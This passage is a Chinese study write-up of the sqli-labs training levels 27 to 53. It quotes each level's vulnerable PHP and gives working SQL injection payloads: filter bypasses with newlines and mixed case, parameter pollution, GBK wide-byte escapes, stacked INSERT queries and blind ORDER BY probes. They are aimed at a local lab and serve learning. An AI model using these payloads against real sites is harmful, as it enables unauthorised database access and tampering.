$id= preg_replace('/Union/s',"", $id);	    //Strip out Union
$id= preg_replace('/Select/s',"", $id);	    //Strip out select
return $id;
}
```

绕过union/select——利用正则模式的差异

> 可以使用换行符或混合大小写，但是在Less-28，这种方法会失效，需要使用”双写绕过“
>
> 源码中使用了一个特殊的技巧：
>
> - `/select/m`：`m` 代表多行模式，`.` 不匹配换行符。
> - `/union/s`：`s` 代表单行模式，`.` 匹配换行符。
>
> 虽然源码看起来过滤很严，但在实际测试中（或者针对某些特定配置），利用**换行符** `%0a` 打断关键字，往往能绕过这种基于行的匹配。
>
> - `UNION` -> `UNI%0aON`
> - `SELECT` -> `SEL%0aECT`
>
> 此外这里是黑名单（不允许出现什么），大小写不敏感

绕过空格——和上面一样

绕过注释——和上面一样

```php
#利用大小写不敏感和空格（换行符），||
http://127.0.0.1/sqli-labs-php7-master/Less-27/?id=0%27%20UnIoN%20%0a%20SeLeCt%20%0a%201,2,3%20%0a%20||%20%271%27=%271
#数据库
http://127.0.0.1/sqli-labs-php7-master/Less-27/?id=1'%0aand%0aextractvalue(1,concat(0x7e,database(),0x7e))%0aand%0a'1'='1
```

### Less-28：闭合方式‘)    过滤union select联合关键词

```php
function blacklist($id)
{
    $id = preg_replace('/[\/\*]/', "", $id); // 移除 /*
    $id = preg_replace('/[--]/', "", $id);   // 移除 --
    $id = preg_replace('/[#]/', "", $id);    // 移除 #
    $id = preg_replace('/[ +]/', "", $id);   // 移除空格
    // ...省略部分大小写过滤...
    //关键:正则匹配 'union' 后面紧跟一个或多个空白字符，再跟 'select'
    $id = preg_replace('/union\s+select/i', "", $id);
    return $id;
}
```

仔细看正则表达式 `/union\s+select/i`，它只匹配 `union` 和 `select` **连在一起**的情况。但是，源码中**并没有单独过滤 `union` 或 `select` 这两个单词**！我们可以把它们拆开，或者利用换行符绕过。

绕过union select——利用换行符`%0a`

# `login.php` 是 **Less-29 及之后某些关卡**特有的文件，用于模拟 WAF/双层服务器架构。

### Less-29：**HTTP 参数污染注入**（同参数传两个值，后端取后者）

客户端 → Tomcat (JSP) → Apache (PHP) → MySQL
         (WAF/过滤器)     (Web服务器)

1. 客户端请求先到达 **Tomcat 服务器**（充当WAF）
2. Tomcat 检查参数合法性（如：只允许数字）
3. 通过后将请求转发给 **Apache 服务器**
4. Apache 执行SQL查询并返回结果

http://.../login.php?id=1&id=-1' order by 3 --+
                      ↑       ↑
                   用于绕过   实际执行的order by

1. 前端 JS 限制只能输入数字
2. 简易 WAF 只校验**第一个参数 id**，存在参数污染漏洞

http://.../Less-29/login.php?id=1&id=-2' union select 1,2,3 --+

### Less-30：和Less-29一样，闭合方式是“)

###  Less-31：和Less-29一样，闭合方法是“)

### Less-32:宽字节注入

开发者为了防止 SQL 注入，使用了 `addslashes()` 或类似的函数（在 PHP 中常见），这个函数会将单引号 `'` 转义为 `\'`。

```php
// 核心逻辑：将 ' 转为 \'，让你无法闭合引号
$id = check_addslashes($_GET['id']);
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

![image-20260518195115357](./assets/image-20260518195115357.png)

**宽字节注入（Wide Character Injection）**，利用的是数据库字符集（如 GBK）与转义函数之间的编码差异。

**Hex（十六进制）是 GBK 编码在计算机底层的存储形式**。

宽字节绕过：输入 id=1%df'。

1. 系统转义后变为 1%df\\'（`\` 的URL编码是 `%5c`），也就是 `1%df%5c%27`。
2. 在 **GBK编码** 中，`%df%5c` 恰好组合成一个合法的汉字（如“運”）。这导致 **反斜杠 `\`（%5c）被“吃掉”了**，不再具备转义功能。
3. 剩下的 `%27`（即单引号 `'`）成功“逃逸”出来，闭合了SQL语句中的前一个单引号，从而可以注入。

```php
http://127.0.0.1/sqli-labs-php7-master/Less-32/index.php?id=1%df%27%20order%20by%203%20--+
```

![image-20260518195725843](./assets/image-20260518195725843.png)

### Less-33：**宽字节注入**

- **Less-32**：使用自定义的 `check_addslashes()` 函数（通过 `preg_replace` 实现）
- **Less-33**：使用 PHP 内置的 **`addslashes()`** 函数 

```php
// Less-33 核心代码
$id = check_addslashes($_GET['id']);  // 调用 addslashes 转义
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
mysql_query("set names gbk");  // 设置 GBK 编码
```

```php
http://127.0.0.1/sqli-labs-php7-master/Less-33/?id=-1%df' order by 3 --+
```

### Less-34:POST 表单宽字节注入

GET 宽字节转**POST 宽字节**

登录框利用`%df'`逃逸单引号

```php
// Less-34/index.php 核心代码
$uname = addslashes($_POST['uname']);    // 转义用户名
$passwd = addslashes($_POST['passwd']);  // 转义密码

$sql = "SELECT * FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
mysql_query("SET NAMES gbk");  // GBK 编码
```

这里Username输入1%df%27 or 1=1 --+，密码任意，用BurpSuit抓包之后得到：

![image-20260518200733898](./assets/image-20260518200733898.png)

这里修改uname=1%df%27 or 1=1 --+  ，之后可以得到正确的显示

### Less-35：**数字型注入**

```php
// Less-35/index.php 核心代码
$id = addslashes($_GET['id']);  
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";  // 没有引号包裹！
mysql_query("SET NAMES gbk");
```

- addslashes()` 仍然在转义特殊字符（`'` → `\'`）
- 但 SQL 语句中 **`$id` 没有用引号包裹**
- 因此：**不需要闭合任何引号，直接注入即可**

因此这里的addslashes是无效的

### Less-36：高阶宽字节注入

```php
// Less-36/index.php 核心代码
$id = mysql_real_escape_string($_GET['id']);  // 转义特殊字符
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
mysql_query("SET NAMES gbk");  // GBK 编码
```

虽然 `mysql_real_escape_string()` 比 `addslashes()` 更安全，但在 **GBK 编码**下，它同样无法正确处理多字节字符。

```php
http://127.0.0.1/sqli-labs-php7-master/Less-36/?id=1%df' order by 3 --+
```

### Less-37：POST 登录框 + 宽字节

这里联合查询我当时输入uname=1%df%27 order by 2 --+&passwd=123&submit=Submit还是报错

可以用报错注入：uname=1%df%27 and extractvalue(1,concat(0x7e,database())) --+&passwd=123&submit=Submit

### Less-38：堆叠查询注入；分号注入

堆叠注入是指**在一个 SQL 语句结束后，用分号 `;` 分隔，再执行第二条 SQL 语句**。

PHP 中的 `mysqli_multi_query()` 函数就支持这种多语句执行。

```php
// Less-38/index.php 核心代码
$id = $_GET['id'];  // 没有转义！
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";

// 使用 multi_query 支持多语句执行
mysqli_multi_query($conn, $sql);
```

```php
http://127.0.0.1/sqli-labs-php7-master/Less-38/?id=1'; INSERT INTO users VALUES (100,'hacker','hacker') --+
```

### Less-39：纯数字型堆叠注入

```php
http://127.0.0.1/sqli-labs-php7-master/Less-39/?id=1; INSERT INTO users VALUES (100,'hacker','hacker') --+
```

### Less-40：带括号格式 + 堆叠查询注入

闭合方式是‘)

```php
http://127.0.0.1/sqli-labs-php7-master/Less-40/?id=1'); INSERT INTO users VALUES (100,'hacker','hacker') --+
```

### Less-41:数字型堆叠注入

不显示 SQL 错误信息（盲注类型）

需盲注或堆叠验证

```PHP
http://127.0.0.1/sqli-labs-php7-master/Less-41/?id=1; INSERT INTO users VALUES (100,'hacker','hacker') --+
```

### Less-42：登录框 POST 注入，后台执行**登录 + 密码修改**语句

```PHP
// Less-42/index.php 核心代码
$username = mysqli_real_escape_string($conn, $_POST['login_user']);
$password = $_POST['login_password'];  // 密码没有转义！

$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
mysqli_multi_query($conn, $sql);  // 支持多语句执行
```

1. **用户名**：使用 `mysqli_real_escape_string()` 转义（不能注入）
2. **密码**：**没有转义**（注入点在这里！）
3. 使用 `mysqli_multi_query()` 支持堆叠注入
4. 闭合方式：用户名和密码都是单引号包裹

在密码这里注入

login_user=admin&login_password=admin%27%20or%201=1%20--%2B&mysubmit=Login

### Less-43:**登录页面的堆叠注入**，注入点在**密码字段**,闭合方式变成了**单引号+括号 `')`**

login_user=admin&login_password=1%27%29%3B%20INSERT%20INTO%20users%20VALUES%20(100,%27hacker%27,%27hacker%27)%20--%2B&mysubmit=Login

### Less-44：登录框单引号注入，注入点在**密码字段**，但**没有错误回显**（盲注类型）。

```php
// Less-44/index.php 核心代码
$username = mysqli_real_escape_string($conn, $_POST['login_user']);
$password = $_POST['login_password'];  // 密码没有转义！

$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
mysqli_multi_query($conn, $sql);  // 支持多语句执行

// 关键：没有错误回显！
if (!mysqli_error($conn)) {
    // 只显示登录成功或失败
}
```

1. 支持堆叠注入
2. **没有 SQL 错误回显**（盲注）

**密码**：`1'; INSERT INTO users VALUES (100,'hacker','hacker') --+`

```
login_user=admin&login_password=1%27%3B%20INSERT%20INTO%20users%20VALUES%20(100,%27hacker%27,%27hacker%27)%20--%2B&mysubmit=Login
```

### Less-45：**单引号 + 括号** + 无错误回显注入点在**密码字段**，但闭合方式变成了**单引号+括号 `')`**

**密码**：`1'); INSERT INTO users VALUES (100,'hacker','hacker') --+`

login_user=admin&login_password=1%27%29%3B%20INSERT%20INTO%20users%20VALUES%20(100,%27hacker%27,%27hacker%27)%20--%2B&mysubmit=Login

### Less-46：order by 排序注入(数字型)

可执行：报错注入、时间盲注、堆叠

`RDER BY` 用于对查询结果排序：

```
SELECT * FROM users ORDER BY $id;
```

如果 `$id` 参数可控，攻击者可以注入恶意代码，利用 `ORDER BY` 子句的特殊性进行**报错注入**、**布尔盲注**或**时间盲注**。

```php
// Less-46/index.php 核心代码
$id = $_GET['sort'];  // 直接获取，没有转义
$sql = "SELECT * FROM users ORDER BY $id";
$result = mysqli_query($conn, $sql);
```

1. **没有转义**，直接拼接到 `ORDER BY` 子句
2. 注入点在排序字段，不是 `WHERE` 子句
3. 无法使用 `UNION` 注入（因为 `ORDER BY` 在查询最后）
4. 需要使用**报错注入**、**布尔盲注**或**时间盲注**

```
http://127.0.0.1/sqli-labs-php7-master/Less-46/?sort=1 and extractvalue(1,concat(0x7e,database(),0x7e))
```

### Less-47:字符型注入   **`ORDER BY` 后面的参数被单引号包裹了**

```php
// Less-47/index.php 核心代码
$sort = $_GET['sort'];  // 直接获取，没有转义
$sql = "SELECT * FROM users ORDER BY '$sort'";
$result = mysqli_query($conn, $sql);
```

1. 需要使用**报错注入**、**布尔盲注**或**时间盲注**
2. 需要使用--  +

```
http://127.0.0.1/sqli-labs-php7-master/Less-47/?sort=1' and extractvalue(1,concat(0x7e,database())) --+
```

### Less-48：ORDER BY 注入（数字型 + 盲注）

Less-48 与 Less-46 类似，都是**数字型 ORDER BY 注入**，但**没有错误回显**（盲注类型）。

```php
// Less-48/index.php 核心代码
$sort = $_GET['sort'];  // 直接获取，没有转义！
$sql = "SELECT * FROM users ORDER BY $sort";
$result = mysqli_query($conn, $sql);

// 关键：没有错误回显！
// 只显示查询结果，不显示 SQL 错误
```

1. 无法使用 `extractvalue()` / `updatexml()` 报错注入‘
2. 只能使用**布尔盲注**或**时间盲注**

 布尔盲注：

```
# 判断数据库名第一个字符是否为 's'
http://127.0.0.1/sqli-labs-php7-master/Less-48/?sort=IF(ascii(substr(database(),1,1))=115, id, username)
```

- 如果按 `id` 排序 → 条件为真 → 第一个字符是 `'s'`（ASCII 115）
- 如果按 `username` 排序 → 条件为假

时间盲注：

```
# 判断数据库名第一个字符是否为 's'
http://127.0.0.1/sqli-labs-php7-master/Less-48/?sort=1 and if(ascii(substr(database(),1,1))=115, sleep(5), 0)
```

如果页面延时5秒，说明条件为真。

### Less-49：ORDER BY 注入（字符型 + 盲注）

需要注释

布尔盲注：

```
# 判断数据库名第一个字符是否为 's'（ASCII 115）
http://127.0.0.1/sqli-labs-php7-master/Less-49/?sort=1' and IF(ascii(substr(database(),1,1))=115, id, username) --+
```

时间盲注：

```
# 判断数据库名第一个字符是否为 's'
http://127.0.0.1/sqli-labs-php7-master/Less-49/?sort=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 0) --+
```

### Less-50:ORDER BY 注入（堆叠注入）

```php
// Less-50/index.php 核心代码
$sort = $_GET['sort'];  // 直接获取，没有转义
$sql = "SELECT * FROM users ORDER BY $sort";

// 关键：使用 multi_query 支持多语句执行
mysqli_multi_query($conn, $sql);
do {
    if ($result = mysqli_store_result($conn)) {
        mysqli_free_result($result);
    }
} while (mysqli_next_result($conn));
```

1. **数字型 ORDER BY**，不需要闭合引号
2. 使用 `mysqli_multi_query()` **支持堆叠注入**
3. 可以执行多条 SQL 语句（用分号 `;` 分隔）
4. 有错误回显（可以报错注入）

报错注入：

```
# 获取数据库名
http://127.0.0.1/sqli-labs-php7-master/Less-50/?sort=1 and extractvalue(1,concat(0x7e,database()))
```

堆叠注入：

```
# 插入新用户
http://127.0.0.1/sqli-labs-php7-master/Less-50/?sort=1; INSERT INTO users VALUES (100,'hacker','hacker') --+
```

### Less-51:ORDER BY 注入（单引号 + 堆叠注入）

### Less-52:ORDER BY 注入（数字型 + 堆叠 + 盲注）

### Less-53:ORDER BY 注入（单引号 + 堆叠 + 盲注）

